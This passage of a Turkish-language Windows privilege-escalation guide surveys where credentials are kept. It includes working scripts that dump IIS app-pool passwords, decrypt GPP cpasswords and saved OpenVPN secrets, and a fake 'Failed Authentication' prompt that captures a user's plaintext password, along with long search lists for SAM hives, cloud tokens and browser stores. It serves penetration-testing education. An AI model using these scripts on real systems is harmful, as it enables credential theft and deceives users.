        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır; birçoğu [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)** adresindeki bilgilere göre DLL Sideloading'e karşı savunmasızdır.**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarları altında parolayla ilgili değer adlarını tutar. Örneğin, [üreticinin kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca incelenmesi gereken bir ipucudur: bu kimlik bilgisini değerlendirmeden önce kurulu sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılıyor olması ve o hesap için yetkiniz bulunması gerekir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına dahil etmeyin.

### Korunan sayfalar içeren paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa, **dosya şifrelemesini** çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifreli olduğunu göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; geniş kapsamlı envanter çıkarırken olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin var olduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` yolunu uzaktan çalıştırma değişikliklerinin depolandığı yer olarak belgeliyor; veri dizini yapılandırılabilir ve `ProgramData` altında olmak zorunda değildir. Okunabilir bir yama; kimlik bilgisi dosyasına, şifreleme anahtarına veya her ikisini kullanan bir betiğe yönelik kaldırılmış ya da eklenmiş başvuruları koruyor olabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı, AES anahtarının yanı sıra şifrelenmiş dizgeyi de gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrı olarak sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin; ardından yetkiniz dahilinde ilgili içeriği, sırları rutin envanter çıktısına yazdırmadan inceleyin. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve sırlara derleme değişikliklerinde yer vermekten kaçının.

### Özel yerel yönetici parolası döndürme

Kurum içinde geliştirilmiş bir parola döndürücü, yerel bir hizmette şifrelenmiş yerel yönetici parolasını tutarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında saklıyor olabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback adresini dinleyen bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulamanın başarılı olması, ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme tohumu veya anahtar materyali şifreli verinin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce anahtar türetme yöntemini dikkatlice inceleyin. Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak açıkta olan bir tohumdan AES anahtarını deterministik biçimde türeten bir şema bu parolayı korumaya uygun değildir; Go, bu paketin güvenlik açısından hassas rastgelelik gerektiren işlemler için uygun olmadığını belirtiyor. Kurtarılan parolayı bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubundaki bir hesaba ait olduğunu doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş bir veri bloğu bu koşulların hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar materyalini rutin envanter çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. LAPS'in dizin tabanlı veya Entra destekli depolaması ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucu eklentisi arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü bir hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin envanter çıktısına dahil etmeyin. Bir eklenti yolu tek başına bir sırrın var olduğunu kanıtlamaz; kurtarılan bir hizmet parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara erişim sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin düzeni için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanı kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgeleri](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html), parolaların düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenerek saklanabileceğini belirtiyor. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne dosyanın okunabildiğini ne de kimlik bilgilerinin yeniden kullanıldığını kanıtlar. Bu yol yalnızca envanter için bir ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına dahil etmeyin.

Ayrı olan `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolunun yapılandırılmış bağlantı noktalarını ve bağlandığı arayüzü açığa çıkarabilir. Openfire genellikle yönetici konsolunu loopback adresine bağlar; dinleyici çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme politikasını ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmetin bağlamında çalışmasına yol açabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Üreticinin [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` olarak adlandırılan Velociraptor sunucu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara erişim sağlayıp sağlamayacağı; sunucu kullanıcı rollerine, API erişilebilirliğine ve sunucunun ya da hedef aracının hangi kimlik altında çalıştığına bağlıdır. İstemci yapılandırması farklı materyaller içerir; böyle bir dosyanın bulunması sunucu CA'sına erişimi kanıtlamaz. Bazı kurulumlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyaların ACL'lerini inceleyin. Olası bir konum `%ProgramFiles%\VelociraptorServer\server.config.yaml` olabilir; farklı bir yol yapılandırılmışsa hizmetin kullandığı yolu esas alın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten mevcut olduğunu doğrulayın. Özel anahtarı günlüklere veya envanter çıktısına yazdırmaktan kaçının. Üreticinin `config api_client` iş akışı, istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak sunucu tarafında etkili bir rol de gerekir. Böyle bir rol oluşturmak veya değiştirmek, veri deposuna yazma erişimi ya da sunucuyu yeniden başlatma gerektirebilir. Bu yazma işlemlerine izin yokken bile mevcut ayrıcalıklı bir sunucu kimliği bir erişim yolu sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır; bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırma kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifreli deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılmış bir oturum yedeği ise `sessions-backup.dat` adını taşıyıp başka bir yerde saklanabilir. [SolarWinds'in dışa aktarma kılavuzuna](https://thwack.solarwinds.com/discussion/comment/115591) göre dışa aktarılan dosyalar parolayla şifrelenir ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebilir; [destek forumunda](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depolama konumu belirtilmiştir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### PuTTY SSH Ana Bilgisayar Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH key'dir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca şifresi çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Bazı ssh anahtarları oluşturup bunları `ssh-add` ile eklemeyi ve ssh üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM ve SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen yedekleme veya görüntü dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce görüntünün **üye adlarını** inceleyin; yalnızca `.wim` dosya adı hive'ların açığa çıktığını kanıtlamaz ve rutin `install.wim`, `boot.wim` ve kurtarma görüntüleri sıkça yanlış izlenim oluşturur. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows görüntüsü kılavuzuna](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosyası başvurusuna](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosyayı arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik vardı. Ancak bu yöntemde önemli güvenlik açıkları bulunuyordu. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPO'lar) tüm etki alanı kullanıcıları tarafından erişilebilirdi. İkinci olarak, GPP'lerde AES256 ile şifrelenen parolalar, herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak herhangi bir kimliği doğrulanmış kullanıcı tarafından çözülebilirdi. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev parolayı çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumuyla ilgili ayrıntıları içererek bu güvenlik açığının belirlenmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumunda arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ı çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot içindeki yedek arşivleri

Doğrudan sunulan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir ifşa olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşiv adı, arşivin bir sır içerdiğini veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını göstermez.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Kullanıcının bunları bilebileceğini düşünüyorsanız, **kullanıcıdan kendi kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini her zaman isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir zamanlar **parolaları** **düz metin** veya **Base64** biçiminde içermiş bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe uzantısı olmayan dosya adı listesi varyantı

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanılarında genellikle `.psafe3` uzantısı kullanılır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, onu okuyabileceğinizi, kilidini açabileceğinizi veya kayıtlı kimlik bilgilerini kullanabileceğinizi göstermez. Bu tür dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için asıl ana parola ve yapılandırılmış tüm key-file veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce belirtilen hesabı ve NT hash'inin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişimi, hesap hakları ve ayrıca gereken tüm hizmet yürütme adımları da sağlanmalıdır. Envanterde veritabanı veya kayıtlı kimlik bilgileri yazdırılmamalı, bunun yerine kasa yolu ve okunabilirlik durumu raporlanmalıdır.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe uzantısı olmayan arama komutu varyantı

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz eden dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinmiş dosyayı ise eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve mevcut kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir gizli bilgi içerdiğinin kanıtı olarak değil, incelenmesi gereken bir aday olarak değerlendirin.

